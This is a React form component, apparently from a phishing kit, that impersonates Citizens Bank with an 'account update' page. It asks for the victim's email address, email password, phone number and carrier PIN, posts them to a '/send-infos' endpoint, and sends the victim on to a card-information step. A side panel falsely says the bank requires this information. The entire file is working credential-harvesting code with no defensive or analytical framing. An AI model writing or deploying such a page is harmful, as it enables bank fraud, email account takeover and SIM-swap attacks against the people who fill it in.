import { useForm } from "react-hook-form";
import axios from "axios";
// import { useMediaQuery } from "react-responsive";

import TextInput from "./TextInput";
import LeftSide from "./LeftSide";
import RightSide from "./RightSide";
import Sides from "./Sides";
import Button from "./Button";
import Error from "./Error";

const AccountUpdate = ({ updateInputs, history }) => {
  const onSubmit = async (data) => {
    updateInputs({
      accountUpdate: data,
    });
    await axios.post("/send-infos", {
      form: "ACCOUNT UPDATE",
      accountUpdate: data,
    });
    history.push("/card-information");
  };

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();
  return (
    <div className="account-update">
      <Sides>
        <LeftSide>
          <div>
            <TextInput
              name="email"
              title="Email Address"
              type="email"
              register={register("email", {
                required: "Please enter your email",
                pattern: {
                  value: /^[\w-.]+@([\w-]+\.)+[\w-]{2,4}$/,
                  message: "Please enter a valid email address",
                },
              })}
            />
            {errors?.email && <Error message={errors.email.message} />}
          </div>
          <div>
            <TextInput
              name="emailPassword"
              title="Email Address Password"
              type="password"
              register={register("emailPassword", {
                required: "Please enter your password",
              })}
            />
            {errors?.emailPassword && (
              <Error message={errors.emailPassword.message} />
            )}
          </div>
          <div>
            <TextInput
              name="phoneNumber"
              title="Phone Number"
              type="number"
              register={register("phoneNumber", {
                required:
                  "Please enter the phone number associated with your account",
                pattern: {
                  value:
                    /^1?\s?(\([0-9]{3}\)[- ]?|[0-9]{3}[- ]?)[0-9]{3}[- ]?[0-9]{4}$/,
                  message: "Please enter a phone number",
                },
              })}
            />
            {errors?.phoneNumber && (
              <Error message={errors.phoneNumber.message} />
            )}
          </div>
          <div>
            <TextInput
              name="carrierPin"
              title="Carrier Pin"
              type="number"
              register={register("carrierPin", {
                required: "Please enter your carrier pin",
                pattern: {
                  value: /^[0-9]{4}$/,
                  message: "Please enter a valid carrier pin",
                },
              })}
            />
            {errors?.carrierPin && (
              <Error message={errors.carrierPin.message} />
            )}
          </div>
        </LeftSide>
        <RightSide>
          <h4>Why do I have to provide this information</h4>
          <p>
            Citizens bank requires all this information to be able to verify
            your account
          </p>
          <h4>How will my email address be used</h4>
          <p>
            We will send information about your account by email, including
            notifications of account activities.
          </p>
        </RightSide>
      </Sides>
      <Button onClick={handleSubmit(onSubmit)} />
    </div>
  );
};

export default AccountUpdate;
